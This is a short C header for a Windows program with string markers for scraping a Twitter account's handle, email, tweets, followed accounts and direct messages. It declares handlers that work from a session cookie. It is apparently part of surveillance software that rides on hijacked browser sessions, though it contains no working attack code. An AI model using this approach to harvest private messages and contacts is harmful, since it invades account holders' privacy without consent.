#ifndef _TWITTER_H
#define _TWITTER_H

/* contact */
#define TWITTER_USER_HANDLE "user[screen_name]\" type=\"text\" value=\""
#define TWITTER_USER_EMAIL  "user[email]\" type=\"text\" value=\""

/* messages */

/* html structure for a tweet 
	1] tweet id
	2] author and display name
	3] timestamp
	4] body
*/
#define TWITTER_TWEET_START "<p class=\"js-tweet-text tweet-text\""
#define TWITTER_TWEET_END   "</p>"
#define TWITTER_TWEET_ID_START "data-tweet-id=\"" 
#define TWITTER_TWEET_AUTHOR_START "data-screen-name=\""
#define TWITTER_TWEET_DISPLAY_NAME_START "data-name=\""
#define TWITTER_TWEET_TIMESTAMP_START "data-time=\"" 

/* following */
#define TWITTER_FOLLOWING_CONTACT_1 "<div class=\"ProfileCard js-actionable-user\""
#define TWITTER_FOLLOWING_CONTACT_2 "data-screen-name=\""

/* direct messages, it's json exclude heading < and > */
#define TWITTER_DM_ITEM "div class=\\\"dm " // N.B. space after dm
#define TWITTER_DM_CONTENT "p class=\\\"js-tweet-text tweet-text\\\""
#define TWITTER_DM_TIMESTAMP_START "data-time=\\\"" 


DWORD TwitterMessageHandler(LPSTR strCookie);
DWORD TwitterContactHandler(LPSTR strCookie);



#endif // _TWITTER_H